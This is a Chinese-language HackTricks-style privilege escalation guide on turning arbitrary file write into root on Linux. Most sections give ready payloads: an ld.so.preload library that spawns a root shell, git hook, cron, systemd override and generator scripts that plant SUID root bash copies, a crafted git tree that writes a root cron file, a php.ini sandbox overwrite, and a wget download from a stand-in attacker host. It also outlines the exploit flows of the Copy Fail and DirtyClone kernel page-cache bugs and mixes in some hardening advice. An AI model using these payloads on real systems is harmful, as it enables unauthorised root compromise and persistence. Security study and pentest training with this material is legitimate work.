# 任意文件写入 root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

`/etc/ld.so.preload` 是一个系统范围的共享对象列表，动态链接器会在加载其他共享对象之前加载这些对象。安全执行模式会对预加载施加额外限制，因此 `/tmp/pe.so` 这样的库路径并非通用的 SUID-binary 技巧。\
如果你能够创建或修改该文件，那么加载此文件的进程就会在加载其他共享对象之前加载其中列出的库，从而允许代码在该进程的上下文中执行。<sup>[[12]](#references)</sup>

例如：`echo "/tmp/pe.so" > /etc/ld.so.preload`

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unlink("/etc/ld.so.preload");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```

### Git hooks

**Git hooks** 是在 repository 中发生特定事件（包括 commit 和 merge 操作）时运行的可执行脚本。如果**特权脚本或用户**执行这些操作，且攻击者可以**写入 `.git` 文件夹**，就可以利用 hook **提升权限**。<sup>[[13]](#references)</sup>

例如，可以在 git repo 的 **`.git/hooks`** 中**生成脚本**，使其在每次创建新 commit 时都运行：

```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/0xdf' > pre-commit
chmod +x pre-commit
```

### 特权 Git tree 导出 path traversal

特权同步器可能不会执行 checkout，而是使用 `git ls-tree` 枚举受攻击者影响的 repository，通过 `git cat-file` 读取每个 blob，将报告的路径名与暂存目录拼接，再自行写入文件。如果它同时使用 `-c safe.directory=*`（禁用 Git 对不同所有者 repository 的防护）且不检查目标路径是否仍位于指定目录内，就会导致**以同步器权限任意写入文件**。绝对 tree-entry 名称会让 Python 的 `os.path.join(stage, name)` 丢弃 `stage`；包含 `../` 的相对名称则会在文件系统解析路径时逃逸。由于应用程序直接写入原始 tree，而不是让 Git 执行 checkout，因此 checkout 阶段对路径名的拒绝无法保护写入目标。<sup>[[30]](#references)[[32]](#references)[[33]](#references)</sup>

在 root 服务、定时器、部署代理、模板导入器和备份/恢复任务中查找这种代码结构：<sup>[[30]](#references)</sup>

```python
entries = git("-c", "safe.directory=*", "ls-tree", "-rz", "HEAD")
for mode, oid, git_path in parse(entries):
    target = os.path.join(stage_root, git_path)  # no containment check
    os.makedirs(os.path.dirname(target), exist_ok=True)
    with open(target, "wb") as output:
        output.write(git("cat-file", "blob", oid))
```

Tree 条目编码为 `<mode> SP <name> NUL <raw object ID>`。`git hash-object --literally` 选项有意允许普通解析或 `git fsck` 可能拒绝的对象数据，因此可以在一次性 clone 中构造一个文件名为绝对目标路径的 tree。此示例创建一个 cron 文件 blob，将构造好的 tree 封装进 commit，并将分支移至该 commit；但利用仍需要具备更新特权任务所使用的仓库的权限，并且 Git 服务器必须接受格式错误的对象。<sup>[[30]](#references)[[31]](#references)</sup>

```bash
blob=$(printf '%s\n' '* * * * * root cp /bin/bash /tmp/rootbash && chmod 6755 /tmp/rootbash' | git hash-object -w --stdin)
{ printf '100644 /etc/cron.d/git-sync\0'; printf '%s' "$blob" | xxd -r -p; } > tree.raw
tree=$(git hash-object -w -t tree --literally --stdin < tree.raw)
commit=$(printf 'crafted tree\n' | git commit-tree "$tree")
git update-ref refs/heads/main "$commit"
git ls-tree -r main
git push --force origin main
```

Hardening 必须同时覆盖仓库摄取和最终文件系统操作：<sup>[[30]](#references)[[33]](#references)[[34]](#references)</sup>

- 将 `safe.directory=*` 替换为服务必须信任的确切仓库，并尽可能以非 root 权限处理仓库。
- 在落盘前拒绝绝对路径名以及包含 `.` 或 `..` 的任何路径组件。路径拼接后，进行规范化并验证目标仍位于预期根目录之下。
- 避免先检查再打开导致的符号链接竞态：相对于可信目录描述符打开文件；在 Linux 上，处理攻击者可控路径时使用 `openat2()`，并设置 `RESOLVE_BENEATH` 和 `RESOLVE_NO_SYMLINKS`。
- 优先在隔离目录中进行常规 checkout，而不是根据 plumbing 输出重新实现 checkout。如果必须摄取原始对象，请启用接收端验证，例如 `receive.fsckObjects=true`；不要降低用于拒绝构造树的路径名相关 `receive.fsck.*` 检查级别。

### 特权配置部署

一些管理服务会将预期的系统状态存储在配置文件中，之后再以较高权限部署。例如，[openmediavault 将配置存储在 `/etc/openmediavault/config.xml`](https://docs.openmediavault.org/en/7.x/faq.html)，其 [RPC 接口](https://docs.openmediavault.org/en/8.x/development/tools/omv_rpc.html)可应用服务更改。如果低权限账户能够写入或替换该文件，请检查该账户是否也能请求授权部署，以及所选模块是否会以 root 身份使用被修改的字段。SSH 账户密钥、计划命令和软件包安装各有不同的前提条件；仅仅存在文件或 XML 文件可写，并不能证明其中任何一种情况成立。检查文件和父目录权限、调用者的组及 RPC 授权、已安装版本，以及实际使用该配置的程序；枚举期间不要编辑配置或调用 apply 操作。

`/etc/fail2ban/action.d/` 下的 Fail2Ban action 定义是另一个特权配置边界。能够写入并搜索该目录的用户可能可以替换 action 定义或添加覆盖配置，但仅凭目录权限无法确认代码执行。请确认已启用的 jail 确实选择了受影响的 action、Fail2Ban 服务以更高权限执行该 action，并且会发生经授权的 reload/restart 和匹配的 ban 事件。只有当无关的 sudo 权限适用于确切的服务调用，且修改后的定义会被加载时，该权限才相关。[Fail2Ban 的 action 配置](https://github.com/fail2ban/fail2ban/blob/master/man/jail.conf.5)介绍了 action 目录与 jail 的关系；其[示例 action](https://github.com/fail2ban/fail2ban/blob/master/config/action.d/iptables.conf)展示了 `actionban` 会在发生 ban 时以服务用户的权限运行。检查权限和有效配置时，不要修改 action 或在枚举期间触发 ban。

当已启用的 Fail2Ban jail 使用包含 WHOIS 信息的邮件 action 时，还存在另一个边界。[CVE-2021-32749](https://github.com/fail2ban/fail2ban/security/advisories/GHSA-m985-3f3v-cwmm) 涉及将不可信的 WHOIS 文本通过管道传给 GNU mailutils `mail`，其转义处理可能会执行命令。如果低权限文件写入者能够更改**所选 WHOIS 客户端**的服务器覆盖配置，就可能影响响应；[Debian 的 `whois.conf(5)`](https://manpages.debian.org/bookworm/whois/whois.conf.5.en.html)介绍了其中一个此类文件，但其路径和用途因安装方式而异。请检查有效的 jail/action、服务身份、实际使用的 WHOIS 客户端及其配置路径、邮件实现、响应是否可控，以及已安装的供应商修复或回移补丁。WHOIS 配置文件可写、Fail2Ban 版本符合条件，或仅存在邮件 action，都不足以证明这条攻击链成立；被动枚举期间不要查询外部服务器或触发 ban。

### TFTP 文件创建和特权软件包钩子

如果可访问的 TFTP 服务以 root 身份运行，其**有效** tftpd-hpa 设置将文件系统根目录作为 `--secure` 目录，并启用了 `--create`，那么它可能跨越容器或本地用户边界。[tftpd-hpa 手册](https://manpages.debian.org/trixie/tftpd-hpa/tftpd.8.en.html)介绍了创建和用户选项。这可能用于在特权配置目录（包括 `/etc/apt/apt.conf.d/`）中创建新文件；但已有文件仍可能无法替换。[APT 配置手册](https://manpages.debian.org/bookworm/apt/apt.conf.5.en.html)介绍了 `APT::Update::Pre-Invoke` 命令。只有当 root 执行的 `apt update` 读取了新配置文件时，它才会成为更高权限的使用者。请确认运行中守护进程的实际参数和身份、网络可达性及过滤规则、目标目录的创建策略、APT 的有效配置范围，以及之后是否会发生特权调用。默认文件、目标目录可写或存在计划执行的 APT 命令，单独来看都不能证明整条攻击路径成立。被动排查时，只读取范围受限的本地配置和元数据，不要上传文件或调用 APT。

### Cron 和时间文件

如果你能**写入 root 会执行的 cron 相关文件**，通常就能在下次任务运行时实现代码执行。有趣的目标包括：<sup>[[14]](#references)[[20]](#references)</sup>

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`、`/etc/cron.daily/*`、`/etc/cron.weekly/*`、`/etc/cron.monthly/*`
- `/var/spool/cron/` 或 `/var/spool/cron/crontabs/` 中 root 自己的 crontab
- `systemd` timers 及其触发的服务

快速检查：

```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```

典型的滥用路径：

- **向** `/etc/crontab` **或** `/etc/cron.d/` **中的文件追加新的 root cron 任务**
- **替换** `run-parts` **已执行的脚本**
- **通过修改现有 timer target 启动的脚本或二进制文件来植入后门**

最简 cron payload 示例：

```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```

如果你只能在 `run-parts` 使用的 cron 目录中写入，就在其中放入一个可执行文件：

```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```

Notes:

- `run-parts` 通常会忽略文件名中包含点号的文件，因此优先使用 `backup` 这类名称，而不是 `backup.sh`。<sup>[[15]](#references)</sup>
- 有些系统使用 `systemd` 定时器，而不是传统 cron，但利用思路相同：**修改 root 稍后将要执行的内容**。<sup>[[20]](#references)</sup>

### Service 和 Socket 文件

如果你可以写入 **`systemd` unit 文件**或这些文件引用的文件，那么在重新加载并重启 unit 后，或者等待服务/Socket 激活路径触发时，你可能可以获得以 root 身份执行代码的能力。<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)</sup>

还要检查对系统 unit 目录本身的写入和搜索权限，包括 ACL：即使用户无法读取/列出目录，也可能在 `/etc/systemd/system` 中创建新的 unit。仅有这个路径并不会启动任何内容。请确认 system manager 会加载这个新 unit、调用者对其名称拥有实际生效且具备 root 权限的 `systemctl start` 或 `restart` 授权（或存在其他特权激活路径），并且服务会以预期身份运行。磁盘上已加载的现有 unit 若被修改，可能需要执行 `daemon-reload`；新命名的 unit 加载方式则有所不同。在认定通配符重启规则足够之前，请仔细检查确切的 sudo 参数和排除项。参见 [systemd unit 搜索路径](https://www.freedesktop.org/software/systemd/man/latest/systemd.unit.html)和 [systemctl 加载与重新加载语义](https://www.freedesktop.org/software/systemd/man/latest/systemctl.html)。

值得关注的目标包括：

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- `/etc/systemd/system/<unit>.d/*.conf` 中的 drop-in 覆盖文件
- `ExecStart=`、`ExecStartPre=`、`ExecStartPost=` 引用的服务脚本/二进制文件
- root 服务加载的可写 `EnvironmentFile=` 路径

快速检查：

```bash
ls -la /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
```

常见的滥用路径：

- **覆盖 `ExecStart=`**：修改你有权限更改的 root 所有服务单元
- **添加 drop-in override**：先清除旧的 `ExecStart=`，再添加恶意的 `ExecStart=`
- **植入后门**：修改服务单元已引用的脚本/二进制文件
- **劫持 socket-activated service**：修改相应的 `.service` 文件，使其在 socket 收到连接时启动

恶意 override 示例：

```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```

典型的激活流程：

```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```

如果你无法自行重启服务，但可以编辑由 socket 激活的 unit，那么你可能只需**等待客户端连接**，即可触发以 root 身份执行已植入后门的服务。<sup>[[17]](#references)</sup>

### systemd generator 目录

**System generators** 是由 system manager 在加载 unit files 之前启动的可执行文件，在系统启动和配置重新加载时都会运行。因此，对 system-generator 目录（或现有可执行 generator）的写入权限，是一种容易在审计只检查 `*.service` 和 `*.timer` 文件时被忽略的直接 root 代码执行手段。<sup>[[35]](#references)[[36]](#references)</sup>

常见的搜索顺序是 `/run/systemd/system-generators/`、`/etc/systemd/system-generators/`、`/usr/local/lib/systemd/system-generators/` 和 `/usr/lib/systemd/system-generators/`（某些发行版通过 `/usr` 合并机制提供 `/lib/systemd/system-generators/`）。较早目录中的同名可执行文件会覆盖较晚目录中的文件。不要将这些**输入可执行文件目录**与 `/run/systemd/generator`、`/run/systemd/generator.early` 和 `/run/systemd/generator.late` 混淆；后者包含由 generators 生成的临时 unit 输出。<sup>[[35]](#references)</sup>

快速检查：

```bash
for d in /run/systemd/system-generators /etc/systemd/system-generators \
         /usr/local/lib/systemd/system-generators /usr/lib/systemd/system-generators \
         /lib/systemd/system-generators; do
    [ -e "$d" ] || continue
    namei -l "$d"
    find "$d" -maxdepth 1 -writable -ls 2>/dev/null
    getfacl -p "$d" "$d"/* 2>/dev/null
done
```

新创建的生成器必须设置可执行位。如果写入原语能控制字节但不能控制权限模式，则应以已有的可执行生成器为目标；原地截断它通常会保留其元数据。如果目录本身可写，则创建一个新目录项并将其标记为可执行。<sup>[[35]](#references)</sup>

```bash
cat > /etc/systemd/system-generators/zz-update <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown 0:0 /tmp/rootbash
chmod 4755 /tmp/rootbash
rm -f "$0"
EOF
chmod 755 /etc/systemd/system-generators/zz-update
```

针对 **system** manager 执行 `systemctl daemon-reload` 需要相应的授权，但这会重新运行所有 system generator；否则，就要等待特权用户执行 reload、进行软件包操作或重启。用户 generator 目录（如 `~/.config/systemd/user-generators/`）由用户 manager 执行，**本身不会提供 root 权限**。<sup>[[35]](#references)</sup>

加固和排查时，应检查每个路径组件及 ACL，而不只是最终的权限位；应为 generator 建立哈希和软件包所有权基线，并监控所有 system-generator 输入目录中的创建、重命名、内容或权限变更。监控写入操作很重要，因为一次性 generator 可能在执行后自行删除，而 `/run/systemd/generator*` 下生成的 unit 树会在下次 reload 时重建。<sup>[[35]](#references)[[36]](#references)</sup>

### 覆盖特权 PHP sandbox 使用的受限 `php.ini`

某些自定义 daemon 会通过使用**受限的 `php.ini`**（例如 `disable_functions=exec,system,...`）运行 `php`，来验证用户提供的 PHP。如果 sandbox 中的代码仍具有**任何写入原语**（如 `file_put_contents`），并且你能访问 daemon 使用的**确切 `php.ini` 路径**，就可以**覆盖该配置**以解除限制，然后提交第二个 payload，以提升后的权限运行。<sup>[[2]](#references)</sup>

典型流程：

1. 第一个 payload 覆盖 sandbox 配置。
2. 重新启用危险函数后，第二个 payload 执行代码。

最简示例（替换为 daemon 使用的路径）：

```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```

如果 daemon 以 root 身份运行（或使用 root 所有的路径进行验证），第二次执行会获得 root 上下文。当沙箱化运行时仍能写入文件时，这本质上就是通过覆盖配置实现的**权限提升**。

### binfmt_misc

`binfmt_misc` 在 `/proc/sys/fs/binfmt_misc` 下公开注册项；每个注册项都会将一种文件类型模式关联到一个解释器。其权限影响取决于谁能更改注册项，以及之后由哪个进程执行匹配的文件，因此在将其视为权限提升途径之前，应先确认这些条件。<sup>[[21]](#references)</sup>

如果某个可执行辅助程序具有 `CAP_DAC_OVERRIDE`，并且接受调用者可控的数据、再将其写入 `/proc/sys/fs/binfmt_misc/register`，那么即使调用者无法直接写入该节点，它也可能构成另一条注册途径。枚举时应检查辅助程序的输入和写入行为，不要执行它。如果已注册规则使用 `C` 标志，解释器会获得基于匹配二进制文件的凭据；因此，匹配到由 root 所有的 SUID 文件时，调用者可控的解释器可能会以 root 身份运行。请确认 `binfmt_misc` 的挂载和注册策略、辅助程序的有效 capability、确切规则和解释器路径、SUID 目标是否可执行，以及 `no_new_privs` 或 `nosuid` 挂载是否会抑制 SUID 身份切换。仅凭 capability 位或嵌入的路径字符串，只能作为进一步检查的线索。<sup>[[21]](#references)</sup> 关于抑制 SUID 的条件，请参阅 [execve(2)](https://man7.org/linux/man-pages/man2/execve.2.html)。

### 覆盖 URI scheme 处理程序（如 http: 或 https:）

桌面环境会使用 MIME 关联和 desktop entry 来选择 URI scheme 对应的应用程序；如果攻击者能写入相关的用户级配置目录和 desktop entry 目录，就能将这些 scheme 重定向到其控制的启动器。通过修改 `$HOME/.config/mimeapps.list` 文件，将 HTTP 和 HTTPS URL 处理程序指向恶意文件（例如，`x-scheme-handler/http=evil.desktop` 和 `x-scheme-handler/https=evil.desktop`），用户点击链接时便可能调用该 desktop entry。<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>

```bash
[Desktop Entry]
Type=Application
Name=Evil Desktop Entry
Exec=/bin/sh -c "id > /tmp/mime-handler-pwned"
MimeType=x-scheme-handler/http;x-scheme-handler/https;
```

### Root 执行用户可写的脚本/二进制文件

如果一个特权工作流运行类似 `/bin/sh /home/username/.../script` 的命令（或运行位于非特权用户所有目录中的任何二进制文件），你就可以劫持它：<sup>[[1]](#references)</sup>

- **检测执行情况：**使用 pspy 监控进程，捕捉 root 调用用户可控路径的情况。<sup>[[25]](#references)</sup>

```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```

- **确认可写性：**确保目标文件及其目录归你所有，且你有写入权限。
- **劫持目标：**备份原始二进制文件/脚本，并放入一个可创建 SUID shell（或执行其他 root 操作）的 payload，然后恢复权限：

```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```

- **触发特权操作**（例如，按下会启动 helper 的 UI 按钮）。当 root 重新执行被劫持的路径时，使用 `./rootshell -p` 获取提权后的 shell。

### 仅修改特权二进制文件的 page cache

一些内核 bug 不会修改**磁盘上的**文件，而是只能让你修改可读文件的 **page cache 副本**。如果目标是 **setuid** 二进制文件或其他由 **root 执行**的文件，那么下次执行时可能会运行内存中的攻击者控制字节并提升权限，即使磁盘上的文件哈希没有变化。<sup>[[3]](#references)[[4]](#references)</sup>

可以将其视为一种**仅在运行时生效的文件写入原语**：<sup>[[3]](#references)</sup>

- **磁盘保持干净**：inode 和磁盘上的字节不会改变
- **内存被篡改**：读取或执行缓存页的进程会获取攻击者修改后的内容
- **效果是暂时的**：重启或缓存被逐出后，修改就会消失

这种原语介于传统的**任意文件写入**与 Dirty COW / Dirty Pipe 等较早的 **page-cache abuse** bug 之间：<sup>[[3]](#references)</sup>

- Dirty COW 依赖竞态
- Dirty Pipe 存在写入位置限制
- 如果存在漏洞的路径允许直接写入由文件支持的缓存页，那么仅修改 page cache 的原语可能更可靠

#### 通用 privesc 流程

1. 获取一种能写入**由文件支持的 page cache 页面**的内核原语
2. 将其用于**可读的特权二进制文件**或其他由 root 执行的文件
3. 在页面被逐出缓存**之前**触发执行
4. 在磁盘文件看起来未被修改的情况下，以 root 身份执行代码

典型的高价值目标：

- **setuid-root** 二进制文件
- 由 **root 服务**启动的 helper
- 通常从**共享主机内核/page cache 的容器**中执行的二进制文件

#### AF_ALG + `splice()` 示例路径

Copy Fail (CVE-2026-31431) 是此类问题的一个典型例子。漏洞路径位于 Linux crypto userspace API（`AF_ALG` / `algif_aead`）中：<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

- `splice()` 可以将可读文件的 page cache 页面引用移入 crypto TX scatterlist
- `algif_aead` 的原地解密路径复用了源缓冲区和目标缓冲区
- 随后 `authencesn` 写入目标 tag 区域
- 当该区域仍引用通过 splice 引入、由文件支持的页面时，写入就会落入**目标文件的 page cache**

因此，值得关注的不是 CVE 本身，而是这种模式：

- **将由文件支持的缓存页送入内核子系统**
- 让子系统将其**视为可写输出**
- 在内存中触发小范围、可控的覆盖

公开的 PoC 使用反复执行的 **4 字节写入**，在内存中修补 `/usr/bin/su`，然后执行它。<sup>[[4]](#references)[[7]](#references)</sup>

#### ESP / XFRM + netfilter TEE clone 示例路径

DirtyClone (CVE-2026-43503) 展示了同一种**仅修改 page cache 的 write-to-root** 模式的另一种变体，但这次写入目标是 **IPsec ESP 解密**，而不是 `AF_ALG`。<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

关键技术是**元数据洗白步骤**：

- `splice()` 将一个**只读、由文件支持的 page-cache 页面**放入 ESP-in-UDP 数据包
- 最初的 DirtyFrag 缓解措施会为该 skb 设置 `SKBFL_SHARED_FRAG`，这样 `esp_input()` 就会在解密前**先复制**
- netfilter `TEE` 通过 `nf_dup_ipv4()` -> `__pskb_copy_fclone()` 复制数据包
- clone 保留了**同一个物理 page-cache 引用**，却丢失了 `SKBFL_SHARED_FRAG`
- 然后 `esp_input()` 将 clone 视为安全，并对由文件支持的页面执行**原地 `cbc(aes)` 解密**

因此，审查者应吸取的教训比这个 CVE 更广泛：如果某个缓解措施依赖 **skb/page 元数据**来判断操作是否必须先复制，那么任何**保留底层页面却丢弃元数据的 clone/copy 路径**，都可能悄然重新开放该写入原语。

典型利用流程：

1. 使用 `unshare(CLONE_NEWUSER | CLONE_NEWNET)`，在私有 network namespace 中获取 **`CAP_NET_ADMIN`**
2. 启用 loopback，并在 `mangle/OUTPUT` 中安装 **netfilter `TEE` 规则**
3. 通过 `NETLINK_XFRM` 安装 **XFRM ESP transport SA**
4. 将每个目标 4 字节字编码进 SA 的 `seq_hi` 字段（DirtyFrag 的 word-selection 技巧）
5. 发送经 splice 引入的 ESP-in-UDP 数据包，使 **TEE clone** 到达 `esp_input()` 并执行**原地解密**
6. 重复以上操作，直到 `/usr/bin/su` 或其他特权可执行文件的 page-cache 副本中包含攻击者控制的代码

在实际效果上，这与 `AF_ALG` 示例相同：磁盘上的文件保持干净，但 `execve()` 会使用**被篡改的 page cache 字节**并获得 root 权限。<sup>[[8]](#references)[[9]](#references)</sup>

此变体的实用暴露面检查：

```bash
unshare -Urn true 2>/dev/null && echo "user+net namespaces available"
sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null
modprobe -n -v xt_TEE 2>/dev/null
modprobe -n -v esp4 2>/dev/null
modprobe -n -v esp6 2>/dev/null
lsmod | egrep 'xt_TEE|nf_dup_ipv4|esp4|esp6|x_tables'
```

短期攻击面缩减也取决于具体路径：升级到包含 `48f6a5356a33` 的内核可修复 clone 路径，而阻止 `xt_TEE` 自动加载可移除 **flag-laundering step**，阻止 `esp4` / `esp6` 则可移除 **decrypt sink**。<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

#### 暴露面与排查

如果怀疑存在这类漏洞，不要只依赖磁盘完整性检查。还要确认：

```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```

下面的配置值用于区分可加载接口和内置于内核的接口；crypto 构建规则会将 `CONFIG_CRYPTO_USER_API_AEAD` 映射到 `algif_aead`。<sup>[[26]](#references)[[27]](#references)</sup>

- `CONFIG_CRYPTO_USER_API_AEAD=m`：`algif_aead` 可作为模块加载/卸载
- `CONFIG_CRYPTO_USER_API_AEAD=y`：该接口内置于内核
- setuid 二进制文件是很好的目标，因为仅修改 page cache 的补丁就可能足以将本地 foothold 提升为 root

#### 缩减 `algif_aead` 路径的攻击面

如果易受攻击的接口由可加载模块提供：<sup>[[6]](#references)[[28]](#references)[[29]](#references)</sup>

```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```

如果它被编译进内核，一些披露报告称可通过以下方式阻塞 init 路径：<sup>[[28]](#references)</sup>

```bash
initcall_blacklist=algif_aead_init
```

这种缓解措施也值得应用于其他 kernel LPE：如果 exploitation 依赖特定的可选接口，那么禁用或列入黑名单的方式可以切断 exploit 路径，即使暂时还无法完整升级 kernel。<sup>[[6]](#references)[[28]](#references)</sup>



## References

- [1] [HTB Bamboo——劫持由 root 执行、位于用户可写 PaperCut 目录中的脚本](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [2] [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [3] [Tenable：Copy Fail（CVE-2026-31431）常见问题](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [4] [Openwall oss-security 对 CVE-2026-31431 的披露](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [5] [Linux stable 修复：crypto: algif_aead - 恢复为异地操作](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [6] [Copy Fail — CVE-2026-31431 公告](https://copy.fail/)
- [7] [Theori / Xint 技术分析](https://xint.io/blog/copy-fail-linux-distributions)
- [8] [DirtyClone 仓库 / README](https://github.com/rafaeldtinoco/security/tree/main/exploits/dirtyclone)
- [9] [JFrog：剖析并利用 Linux LPE 变种 DirtyClone（CVE-2026-43503）](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
- [10] [Linux 修复：net: skb: 在 `__pskb_copy_fclone()` 中保留 `SKBFL_SHARED_FRAG`（`48f6a5356a33`）](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=48f6a5356a33)
- [11] [Linux 早期缓解措施：为 splice 的 UDP 数据包设置 `SKBFL_SHARED_FRAG`（`f4c50a4034e6`）](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6)
- [12] [ld.so(8) — Linux 手册页](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [13] [Git Hooks](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks)
- [14] [crontab(5) — Linux 手册页](https://man7.org/linux/man-pages/man5/crontab.5.html)
- [15] [run-parts(8) — Debian 手册页](https://manpages.debian.org/bookworm/debianutils/run-parts.8.en.html)
- [16] [systemd.service](https://github.com/systemd/systemd/blob/main/man/systemd.service.xml)
- [17] [systemd.socket](https://github.com/systemd/systemd/blob/main/man/systemd.socket.xml)
- [18] [systemd.unit](https://github.com/systemd/systemd/blob/main/man/systemd.unit.xml)
- [19] [systemd.exec](https://github.com/systemd/systemd/blob/main/man/systemd.exec.xml)
- [20] [systemd.timer](https://github.com/systemd/systemd/blob/main/man/systemd.timer.xml)
- [21] [binfmt_misc — Linux Kernel 文档](https://www.kernel.org/doc/html/latest/admin-guide/binfmt-misc.html)
- [22] [MIME 应用程序关联](https://specifications.freedesktop.org/mime-apps/1.0.1/file.html)
- [23] [Shared MIME-info 规范](https://specifications.freedesktop.org/shared-mime-info/latest-single/)
- [24] [Desktop Entry 规范](https://specifications.freedesktop.org/desktop-entry/latest-single/)
- [25] [pspy](https://github.com/DominicBreuker/pspy)
- [26] [Kconfig 语言](https://docs.kernel.org/kbuild/kconfig-language.html)
- [27] [Linux crypto Makefile](https://raw.githubusercontent.com/torvalds/linux/master/crypto/Makefile)
- [28] [CERT VU#260001：Linux kernel AF_ALG 页面缓存漏洞](https://kb.cert.org/vuls/id/260001)
- [29] [modprobe(8) — Linux 手册页](https://man7.org/linux/man-pages/man8/modprobe.8.html)
- [30] [0xdf — HTB: Nexus](https://0xdf.gitlab.io/2026/09/02/htb-nexus.html)
- [31] [Git `hash-object` 文档](https://git-scm.com/docs/git-hash-object)
- [32] [Git `ls-tree` 文档](https://git-scm.com/docs/git-ls-tree)
- [33] [Git 配置文档](https://git-scm.com/docs/git-config)
- [34] [`openat2(2)` — Linux 手册页](https://man7.org/linux/man-pages/man2/openat2.2.html)
- [35] [systemd generator 文档](https://github.com/systemd/systemd/blob/main/man/systemd.generator.xml)
- [36] [Elastic Security Labs — Linux Detection Engineering：持久化机制](https://www.elastic.co/security-labs/threat-command/primer-on-persistence-mechanisms)
{{#include ../../banners/hacktricks-training.md}}
